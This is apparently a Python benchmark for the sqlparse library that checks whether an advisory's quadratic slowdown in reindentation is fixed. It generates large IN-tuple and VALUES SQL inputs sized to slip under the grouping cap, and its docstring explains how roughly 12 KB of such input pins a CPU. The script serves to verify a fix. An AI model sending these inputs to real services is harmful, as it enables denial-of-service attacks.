"""Reindentation offset benchmarks (GHSA-cfqr-cjx5-5jcm, CWE-1333).

Measures ``format(sql, reindent=True)`` for SQL that stresses
``ReindentFilter._get_offset()``, which reports the column a token starts on.

It used to rebuild the statement prefix from the start of the statement on
every call, and it is called once per group -- so reindenting a list of N
parenthesized tuples cost O(N^2).  An attacker who controls SQL sent to this
opt-in path can size a tuple list to stay just below the grouping-token cap
(``MAX_GROUPING_TOKENS = 10000``), so grouping succeeds and the expensive
reindentation path is entered.  A payload of ~12 KB then pinned a CPU for
seconds.

Both shapes below reach the same offset calculation but through different
filters -- ``IN (...)`` tuple lists via ``_process_parenthesis()`` and
``_process_identifierlist()``, ``VALUES`` lists via ``_process_values()``.

Run with:  python benchmarks/bench_reindent_offset.py
"""

import math
import signal
import time

import sqlparse

TIMEOUT_SECONDS = 60


def _alarm_handler(signum, frame):
    raise TimeoutError()


signal.signal(signal.SIGALRM, _alarm_handler)


def in_tuple_list_sql(n_tuples):
    """WHERE ... IN with n_tuples tuples -- the shape from the advisory."""
    tuples = ', '.join(f'({i}, {i * 2})' for i in range(n_tuples))
    return f'SELECT a FROM t WHERE (col1, col2) IN ({tuples})'


def values_list_sql(n_tuples):
    """INSERT ... VALUES with n_tuples tuples -- reaches _process_values()."""
    tuples = ', '.join(f'({i})' for i in range(n_tuples))
    return f'INSERT INTO t VALUES {tuples}'


def measure(label, sql):
    signal.alarm(TIMEOUT_SECONDS)
    t0 = time.perf_counter()
    status = 'OK'
    try:
        # The vulnerable, opt-in path: reindentation.
        sqlparse.format(sql, reindent=True)
    except sqlparse.exceptions.SQLParseError:
        status = 'CAP'  # grouping token/depth cap fired before reindenting
    except TimeoutError:
        status = 'TIMEOUT'
    finally:
        signal.alarm(0)
    dt = time.perf_counter() - t0
    print(f'  {status:8} {dt:8.3f} s  {label}  ({len(sql)} B)')
    return dt


# Absolute wall-clock is host dependent, so compare growth instead: the work
# scales linearly with the number of tuples, so a patched build should grow
# with an exponent near 1 and the O(N^2) bug with an exponent near 2.  Sizes
# stay below the grouping-token cap; a larger input is rejected quickly by the
# cap instead of reaching the reindentation path.
VECTORS = (
    ('IN-tuple list ', in_tuple_list_sql, (150, 300, 600, 1200)),
    ('VALUES list   ', values_list_sql, (250, 500, 1000, 1950)),
)

verdicts = []
for name, build, sizes in VECTORS:
    print(f'{name.strip()} (format reindent=True):')
    times = [measure(f'{name} n={n:<5}', build(n)) for n in sizes]

    if times[0] > 0 and times[-1] > 0:
        exponent = math.log(times[-1] / times[0]) / math.log(sizes[-1]
                                                             / sizes[0])
    else:
        exponent = 0.0
    print(f'  n grew {sizes[-1] / sizes[0]:.1f}x; '
          f'time grew {times[-1] / times[0]:.1f}x; '
          f'empirical scaling exponent ~= {exponent:.2f}\n')
    verdicts.append((name.strip(), exponent))

vulnerable = [name for name, exponent in verdicts if exponent >= 1.5]
if vulnerable:
    print('EVOHUNT_REINDENT_DOS_VERIFIED: super-linear (>= quadratic) CPU '
          f'growth via {", ".join(vulnerable)} -> ReindentFilter._get_offset '
          'DoS is present (unpatched).')
else:
    print('Growth is ~linear for every vector -> the ReindentFilter offset '
          'fix appears to be present.')
